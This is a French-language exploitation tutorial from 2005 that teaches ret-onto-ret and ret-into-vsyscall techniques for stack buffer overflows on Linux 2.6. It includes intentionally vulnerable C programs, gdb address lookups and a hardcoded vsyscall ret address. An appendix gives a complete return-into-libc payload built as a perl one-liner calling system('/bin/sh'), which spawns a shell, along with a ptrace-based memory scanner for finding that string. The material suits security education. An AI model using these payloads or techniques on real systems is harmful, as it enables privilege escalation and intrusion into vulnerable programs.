@@ -1,0 +1,572 @@
+                   _                 _                   _     _       _        
+                  | |               | |                 | |   (_)     | |       
+          _ __ ___| |_    ___  _ __ | |_ ___    _ __ ___| |_   _ _ __ | |_ ___  
+         | '__/ _ \ __|  / _ \| '_ \| __/ _ \  | '__/ _ \ __| | | '_ \| __/ _ \ 
+         | | |  __/ |_  | (_) | | | | || (_) | | | |  __/ |_  | | | | | || (_) |
+         |_|  \___|\__|  \___/|_| |_|\__\___/  |_|  \___|\__| |_|_| |_|\__\___/ 
+                                                                       
+                                                          _ _     
+                                                         | | |    
+                           __   _____ _   _ ___  ___ __ _| | |___ 
+                           \ \ / / __| | | / __|/ __/ _` | | / __|
+                            \ V /\__ \ |_| \__ \ (_| (_| | | \__ \
+                             \_/ |___/\__, |___/\___\__,_|_|_|___/
+                                       __/ |                      
+                                      |___/          
+
+    -- [ ret-onto-ret-into-vsyscalls
+
+RORIV - Document daté du 18 Mars 2005.
+Synopsis : 
+	+ Méthode d'exploitation originale de buffers overflows
+Caractéristiques : 
+	+ ret-onto-ret
+	+ 2.6.x ret-into-vsyscalls 
+	+ sur stack exécutable
+Points faibles de la méthode présentée :
+	+ sur stack exécutable
+	+ contexte particulier de la pile nécessaire
+Points forts de la méthode présentée :
+	+ contexte particulier fréquent
+	+ prédiction d'adresses
+	+ aucun NOP
+	+ aucun brute-force
+
+Sommaire :
+	1. Présentation du contexte et du problème
+	2. Solution du ret-onto-ret
+	3. Avancées : ret-into-vsyscalls sur 2.6
+	4. Bilan
+	Annexe : return-into-libc
+	Annexe 2 : code source resolver
+
+
+1. LE CONTEXTE ET LE PROBLEME
+-----------------------------
+
+	La méthode que je présente à ceci d'originale qu'elle répond aux 
+problèmes rencontrés lors de l'exploitation d'un buffer overflow sur un contexte
+particulier de la pile. Elle a pour origine un arrachage de cheveux mineur lors 
+d'une tentative d'exploitation...
+	
+	Les difficultés techniques présentées sont fréquentes, nous verrons que 
+le contexte exemple que nous étudierons s'inscrit dans une problématique 
+générale facilement abordable. 
+	La méthode que nous décortiquerons ensuite permet de pallier les 
+difficultés rencontrées en toute simplicité et avec une grande efficacité.
+	D'où le sommaire. Suivez.
+	
+	La lecture de ce tutorial présuppose que vous savez exploiter un 
+classique stack overflow.
+	Disons autrement que si vous savez exploiter un stack overflow, vous 
+comprendrez cet article. 
+	Zut... Vous êtes partis ? 
+
+	...
+		
+	Ha non ? Vous êtes toujours là, très bien. Etudions un petit bout de 
+code "scolaire", et situons-y la vulnérabilité.
+
+--- Exemple ---
+	
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+void    copy(char *str)
+{
+  char	buf[64];
+  int	i;
+
+  memset(buf, 0, 64);
+  for (i = 0; str[i]; i++) {
+	 buf[i] = str[i];
+  }
+}
+
+int     main(int ac, char **av)
+{
+  if (ac < 2) {
+	 fprintf(stderr, "I take at least one argument.\n");
+	 return (0);
+  }
+  copy(av[1]);
+  return (0);
+}
+
+--- Fin exemple ---
+
+	Ce code ne fait rien d'intéressant (vous pouvez l'améliorer si vous 
+voulez gâcher mon plaisir de produire du code inutile). Le programme copie une 
+chaîne de caractère passée sur la ligne de commande dans un buffer de 64 octets 
+à partir de la fonction copy().
+
+	Etant initiés aux stacks overflows, ou bien acharnés sur ce pauvre 
+article, vous aurez deviné que la vulnérabilité se situe dans la fonction 
+copy(). 
+	Si la chaîne est trop longue, on écrase, en dehors du buffer, EBP (si 
+prologue) puis EIP.
+	
+	Nous supposons que le contexte d'exploitation (l'environnement 
+d'exécution) nous empêche de brute-forcer, pour quelque raison que ce soit, 
+l'adresse de retour sur un éventuel shellcode passé en argument.
+	L'idée est donc de passer par une méthode efficace où la prédiction est 
+un levier d'efficacité, par exemple un return-into-libc.
+
+	Voilà posée la requête : exploiter un return-into-libc sur ce code. 
+Pourquoi ? Pour profiter du fait que cette méthode, beaucoup plus précise, 
+constitue une solution alternative à une attaque de force brute - surtout quand 
+le buffer ne fait que 64 octets.
+
+	Si vous ne connaissez pas le principe d'un return-into-libc, lisez 
+l'annexe consacrée à l'explication de cette méthode. Revenez ici plus tard. Non,
+pas ici, deux paragraphes au dessus. 
+	Je postule désormais que vous comprenez qu'il est techniquement 
+nécessaire de préparer un certain nombre de données sur la pile afin de voir 
+aboutir un return-into-libc. Alors soyez attentifs à ce qui suit...
+
+ 	Zoomons le code de la fonction copy(). L'adresse de la chaîne à copier 
+est le seul argument à être passé à la fonction. Autrement dit, c'est le premier
+argument, il se trouve juste après EIP.
+
+	Si l'élement provoquant le buffer overflow - ici une chaîne trop longue 
+(et un code à chier des castors) - est l'un des premiers passé en argument, 
+alors il devient impossible de l'écraser pour placer d'autres données sur la 
+pile. Malheureusement ces "autres données" sont justement celles qui nous 
+servent à réaliser un return-into-libc.
+
+	Comprenez-vous bien pourquoi un ret-into-libc nous est interdit ? 
+Ecraser le pointeur qui est utilisé pour la copie va détourner la copie sur une
+autre donnée que la chaîne de caractères originale et en parallèle la copie 
+continue d'écraser le pointeur à partir de données aléatoires.
+	Pour chaque octet copié sur le pointeur, les données concernées par 
+celui-ci sautent... Danse folle qui se termine sur un octet nul ou une erreur de
+segmentation.
+
+
+2. SOLUTION DU RET-ONTO-RET
+---------------------------
+
+	Comment passer outre cette difficulté ? Question piège, la réponse est 
+dans le titre. Voilà l'état de la pile pour la fonction copy() avant 
+l'exploitation :
+
+haut
+|    ...    |
++-----------+
+|   *str    |
++-----------+
+|    EIP    |
++-----------+
+|	    |
+|  buf[64]  |
+|	    |
++-----------+
+|    ...    |
+bas
+
+	Si nous écrasons EIP avec l'adresse d'une instruction ret, un deuxième 
+retour de fonction sera exécuté.
+	Ce deuxième retour va prendre l'adresse pointée par le registre ESP, à 
+savoir *str et la placer dans EIP. L'exécution continue sur notre chaîne de 
+caractère, qui pourrait tout aussi bien contenir un shellcode.
+
+	Comme l'exécution revient directement sur le début de notre chaîne, nous
+pouvons profiter pleinement des 64 octets du buffer pour placer un shellcode, 
+sans avoir besoins d'instructions de type NOP, et en présupposant, bien sûr, que
+la pile soit exécutable.
+	La prédiction est assurée automatiquement par la configuration de la
+pile. Un seul retour est ici nécessaire, car l'argument qui pointe notre 
+shellcode est le premier. On peut envisager plusieurs retours pour faire 
+coincider EIP et *str si ce pointeur n'est pas le premier, mais le deuxième ou 
+troisième argument passé à la fonction vulnérable.
+
+	Toute la difficulté se résume à trouver l'adresse d'une instruction ret,
+ce qui n'est pas réellement une difficulté en soi : la libc en contient assez 
+pour nourrir toute une armée de shellcoders. On applique les méthodes 
+habituelles de prédiction d'adresses si on n'a pas la main sur le procfs du 
+système local. A moins que...
+
+
+3. RET-INTO-VSYSCALLS SUR LINUX 2.6
+-----------------------------------
+
+	Par chance, les développeurs du kernel ont eu la bonté de prendre en 
+compte nos tracas, et ont intégré sur le noyau 2.6 un support pour les appels 
+système virtuels nativement activé.
+
+	Cet article est pour l'ignorant l'occasion d'en apprendre un peu plus 
+sur les vsyscalls.
+	Les appels système virtuels se présentent sous la forme de code 
+exécutable mappé en espace noyau, mais dont le code est accessible depuis un 
+processus user-land. Ils ont pour but d'accélérer le temps d'exécution de 
+fonctions "basiques", normalement assurées par le noyau, mais dont le code 
+pourrait tout aussi bien être exécuté sans passer par une interruption coûteuse 
+en cycles processeurs.
+	C'est par exemple le cas de la fonction (man 2) sigreturn() qui a son 
+équivalent disponible en vsyscall. 
+
+	Vous l'aurez compris, si le code est exécutable en user-land, alors la 
+région mémoire du code est mappée pour le processus. Confirmons :
+
+--> cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 03:01 589888     /bin/cat
+0804c000-0804d000 rw-p 00003000 03:01 589888     /bin/cat
+0804d000-0806e000 rw-p 0804d000 00:00 0 
+40000000-40016000 r-xp 00000000 03:01 671776     /lib/ld-2.3.2.so
+40016000-40017000 rw-p 00015000 03:01 671776     /lib/ld-2.3.2.so
+40017000-40018000 rw-p 40017000 00:00 0 
+40022000-4014b000 r-xp 00000000 03:01 2048049    /lib/tls/libc-2.3.2.so
+4014b000-40153000 rw-p 00129000 03:01 2048049    /lib/tls/libc-2.3.2.so
+40153000-40157000 rw-p 40153000 00:00 0 
+bffff000-c0000000 rw-p bffff000 00:00 0 
+ffffe000-fffff000 ---p 00000000 00:00 0 
+
+	La région mémoire mappée à 0xffffe000 contient nos vsyscalls... Et 
+peut-être un ret.
+	On attache un processus avec GDB, on désassemble la région mémoire 
+concernée, et qu'obtient-on en louchant un peu ?
+
+(gdb) x/i 0xffffe413
+0xffffe413 <__kernel_vsyscall+19>:      ret
+
+	Il s'avère que sur de nombreux noyaux 2.6 vous pouvez être surs de 
+trouver un return à cette adresse. A vérifier chez vous. 
+	
+	Voilà une utilisation bien pratique des vsyscalls.
+
+
+4. CONCLUSION
+-------------
+
+	Partant d'un problème simple nous avons trouvé une solution élégante 
+pour retourner sans aucune difficulté sur du code exécutable placé sur la pile 
+(ou dans le tas), en écrasant à partir de EIP, voire au delà, zero, un ou 
+plusieurs arguments avec une adresse redondante pointant sur une instruction 
+ret.
+	
+	... 
+	
+	Je n'ai rien à ajouter. Have fun.
+
+
+Clad Strife,
+* Greetz to Frhack team *
+
+
+
+
+ANNEXE : RETURNS-INTO-LIBC
+--------------------------
+
+	Cette annexe constitue un rappel sur les buffer overflows exploitables 
+par return-into-libc. Sa lecture s'adresse aux personnes sachant au moins 
+exploiter un classique stack overflow.
+
+	La méthode du return-into-libc consiste, non pas à exécuter un 
+shellcode, mais à détourner le programme en lui faisant exécuter du code qui, 
+comme vous l'avez compris, est bien souvent dans une librairie telle que la 
+libc.
+	Et comme les librairies sont chargées à des adresses prédictibles sur 
+les noyaux standards, on les retrouve très facilement d'un programme à l'autre.
+
+	La libc, par exemple, contient toutes les fonctions utiles à 
+l'exécution d'un shell. Un simple appel à (man 3) system(), avec 
+l'adresse d'une chaîne "/bin/sh" ne suffirait-il pas à satisfaire certains de 
+nos besoins ? (Si oui, c'est un aveu !).
+
+	Il faut que vous visualisiez le processus suivant : vous venez d'écraser
+EIP avec l'adresse de la fonction system() située dans l'espace mémoire du 
+processus vulnérable. Le programme saute sur system(). La fonction system() va 
+faire son prologue, sans erreurs. Par contre system() va vouloir aller chercher 
+le paramètre que vous lui avez passé, et il s'attend pour cela à ce qu'il y ait 
+un argument sur la pile.
+	L'argument sur la pile, c'est l'adresse d'une chaîne de caractère 
+"/bin/sh". Seulement, pas de bol, elle n'est pas là. Il faut écrire cet argument
+sur la pile si vous voulez que system() le récupère.
+	
+	Et où system() va-t-il récupérer ce fameux pointeur ? Juste après EIP 
+bien sûr. La convention d'appel de fonctions veut que les arguments soit empilés
+dans l'ordre inverse de leur déclaration en C, juste avant d'empiler EIP. Ici, 
+il n'y a qu'un argument. 
+
+	Voilà l'état d'une pile avec zoom sur EIP, avant exploitation d'une 
+fonction vulnérable, et après écrasage des données sur la pile pour un 
+return-into-libc. On dit de cette action que l'on "prépare la pile".
+
+AVANT :			APRES :
+
+haut			haut
+|    ...    |		|    ...    |
++-----------+		+-----------+
+|   QQCH2   |		|   QQCH2   |
++-----------+		+-----------+
+|   QQCH1   |		| "/bin/sh" |
++-----------+		+-----------+
+|    ARG1   |		|  fake EIP |
++-----------+		+-----------+
+|    EIP    |		|  system() |
++-----------+		+-----------+
+|    ...    |		|    ...    |
+bas			bas
+
+	+ system() est l'adresse de la fonction system() dans la libc
+	+ fake EIP est le faux EIP sur lequel ESP va pointer lorsqu'il va 
+	rentrer dans la fonction system(). Pour la fonction system(), qui croit 
+	qu'on vient de l'appeler par un 'call', il y a un EIP là où pointe ESP 
+	quand on rentre dans la fonction. 
+	La convention des Hackers du Dimanche veut que l'on mette ici l'adresse 
+	de la fonction exit(), afin de quitter le programme "proprement" en cas 
+	de retour de system() (erreur ou fin d'exécution).
+	+ "/bin/sh" est un pointeur vers cette chaîne placé là où system() 
+	s'attend à le recevoir, c'est à dire après ce qu'il croit être EIP.
+
+	Les questions qui se posent sont les suivantes :
+	1. Comment récupérer l'adresse de system() ?
+	2. Comment récupérer l'adresse de exit() ?
+	3. Comment récupérer l'adresse de "/bin/sh" quelque part ?
+
+	1 et 2 : utilisez gdb sur un processus en cours d'exécution, tapez 
+x/x system, puis x/x exit.
+	3 : utilisez un scanner de mémoire basé sur ptrace() (memory dumper) ou 
+un programme qui s'auto-parcourt. La libc contient la chaîne "/bin/sh", utilisée
+par exemple par la fonction (man 3) popen().
+
+	Faites attention : la libc doit-être la même et mappée à la même adresse
+pour le programme vulnérable et vos programmes d'essais de récupération 
+d'adresses. En aveugle, on essaye de reproduire l'environnement cible et les 
+jeux de dépendances de librairies (versions des logiciels). Cela est toujours 
+plus ou moins hasardeux... 
+
+	Je vous propose de suivre les exemples qui suivent. Nous supposons un 
+buffer overflow dans un programme exemple, nous voulons l'exploiter par un 
+return-into-libc.
+
+--- Exemple ---
+
+#include        <stdio.h>
+#include        <string.h>
+#include        <unistd.h>
+
+void    copy(char *str)
+{
+  char	buf[1024];
+  char	*new = strdup(str);
+  int	i;
+
+  for (i = 0; new[i]; i++) {
+	 buf[i] = new[i];
+  }
+  buf[i] = 0;
+}
+
+int     main(int ac, char **av)
+{
+  if (ac < 2) {
+	 fprintf(stderr, "I take at least one argument.\n");
+	 return (0);
+  }
+  copy(av[1]);
+  printf("pid = %d\n", getpid());
+  while (1);
+  return (0);
+}
+
+--- Fin exemple ---
+
+	Ce code a été conçu pour vous permettre d'apprendre à faire un 
+return-into-libc. Il copie la chaîne de caractères passée en argument par la
+fonction copy(). Cette fonction est vulnérable à un stack overflow, et permet
+d'écrire autant de données qu'on le souhaite au-delà du tampon buf. Cela nous 
+est permis grâce au strdup() (sinon on écraserait le pointeur utilisé pendant la
+copie juste après EIP).
+
+	Compilez et lancez. "while(1)" est une abomination qui consomme vos 
+ressources. Cela devrait vous motiver à lancer très rapidement GDB sur le 
+processus :
+
+	$ gcc -o vuln vuln.c
+	$ ./vuln toto
+	pid = 1337
+	(autre shell)
+	$ gdb ./vuln 1337
+
+	Voilà maintenant le processus stoppé, votre processeur peut souffler.
+Récupérons l'adresse de system() et d'exit().
+
+	(gdb) x/x system
+	0x400608a0 <system>:    0x83e58955
+	(gdb) x/x exit
+	0x4004d0a0 <exit>:      0x57e58955
+
+	Bien, nous notons donc les adresses 0x400608a0 pour system() et 
+0x4004d0a0 pour exit().
+
+	Il nous faut maintenant trouver l'adresse de "/bin/sh", on va utiliser
+un memory dumper basé sur ptrace() adapté pour cette recherche. Les arguments
+qu'il devra prendre sont le PID du processus, et l'adresse de chargement de la 
+libc. On y reviendra. Pour l'instant compilez le code donné dans l'annexe 2.
+On l'utilise ainsi :
+
+	$ gcc -o memdump memdump.c
+      	$ cat /proc/1337/maps | grep libc
+      	40022000-4014b000 r-xp 00000000 03:01 2048049    /lib/tls/libc-2.3.2.so
+      	4014b000-40153000 rw-p 00129000 03:01 2048049    /lib/tls/libc-2.3.2.so
+	$ ./memdump /bin/sh 1337 40022000
+	Searching...
+	[/bin/sh] found in processus 3560 at : 0x40143735.
+      
+      	Et voilà, nous avons l'adresse d'une chaîne pour ouvrir un shell. Il ne 
+nous reste plus qu'à exploiter... Nous savons que le buffer fait 1024 octets.
+Si EBP est empilé lors du prologue (vérifier par un disass dans GDB) alors nous
+avons 1032 octets à écrire pour écraser entièrement EIP (1024 + 4 + 4).
+
+	Nous devons donc passer l'argument suivant sur la ligne de commande :
+	[1028 octets bourrage] [system()] [exit()] ["/bin/sh"]
+	
+	Ce qui nous donne, en little endian, pour system = 0x400608a0, 
+exit = 0x4004d0a0 et "/bin/sh" = 0x40143735 :
+	(gdb) r `perl -e 'print "x" x 1028, "\xa0\x08\x06\x40", "\xa0\xd0\x04\x40", "\x35\x37\x14\x40"'`
+	Starting program: /tmp/vuln `perl -e 'print "x" x 1028, "\xa0\x08\x06\x40", "\xa0\xd0\x04\x40", "\x35\x37\x14\x40"'`
+	sh-3.00$ 
+
+	Il se peut que 1028 ne soit pas la taille véritablement allouée par le 
+code (cela dépend comment le compilateur gère l'alignement). Chez moi ce fut 
+1036, mais je ne l'ai pas reporté sur l'exemple.
+
+
+
+
+ANNEXE 2 : CODE SOURCE STRING RESOLVER
+--------------------------------------
+
+--- String resolver source code (memdump.c) ---
+
+/*
+** memdump.c for 
+** 
+** Comments : a string resolver. It is basic, slow, beta, and just provided
+** 'as is' with no warranty as code example.
+** 
+** Written by Clad Strife
+** on Fri Mar 18 18:33:38 2005 - Paris
+*/
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+
+void	resolve_string(const char *str, int pid, void *base);
+
+int	main(int ac, char **av)
+{
+	void	*base;
+	void	*result;
+	int	pid;
+
+	/*
+	** We need 4 params :
+	** [progname] string PID 0x[base_address]
+	*/
+	if (ac < 4) {
+		fprintf(stderr, 
+			"Usage :\n%s string PID 0x[base_address]\n", av[0]);
+		return (1);
+	}
+	/*
+	** We init parameters
+	*/
+	base = (void *) strtol(av[3], 0, 16);
+	pid = atoi(av[2]);
+	/*
+	** We call the resolver
+	*/
+	resolve_string(av[1], pid, base);
+	/*
+	** End of game.
+	*/
+	ptrace(PTRACE_DETACH, pid, 0, 0);
+	return (0);
+}
+
+
+/*
+** This function is based on ptrace(). It looks each byte of the memory for
+** a string matching *str.
+** It will print error messages on error while attaching but not if reading
+** memory fails.
+*/
+void	resolve_string(const char *str, int pid, void *base)
+{
+	long	*res;
+	int	length;
+	int	i;
+	int	j;
+	int	inc = sizeof(long);
+	int	flag = 0;	/* disabled */
+
+	/*
+	** Attach processus
+	*/
+	if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
+		perror("ptrace");
+		return;
+	}
+	wait4(pid, 0, 0, 0);
+	/*
+	** length % inc should be equal to 0.
+	*/
+	length = strlen(str) + 1;
+	if (length % inc) {
+		length += inc - (length % inc);
+	}
+	if ((res = malloc(length)) == 0) {
+		perror("malloc");
+		exit(1);
+	}
+	/*
+	** _Ugly_ memory parsing.
+	*/
+	printf ("Searching...\n");
+	while (1) {
+		for (i = 0, j = 0; i < length; i += inc, j++) {
+			void	*tmpbase;
+
+			tmpbase = (void *) ((long) base + i);
+			/*
+			** Read memory
+			*/
+			if ((res[j] = ptrace(PTRACE_PEEKDATA, pid, tmpbase, 0))
+			    == (-1)) {
+				/*
+				** Error ?
+				*/
+				if (errno) {
+					free(res);
+					(flag) || printf("[%s] : not found.\n", 
+							 str);
+					return;
+				}
+			}
+		}
+		/*
+		** Compare data with requested string
+		*/
+		if (!strcmp((char *) res, str)) {
+			printf("[%s] found in processus %d at : %p.\n",
+			       str, pid, base);
+			flag = 1;
+		}
+		/*
+		** Look next bytes
+		*/
+		base = (void *) ((unsigned int) base + 1);
+	}	
+	return;
+}
+
+
+    -- [ Clad-Strife
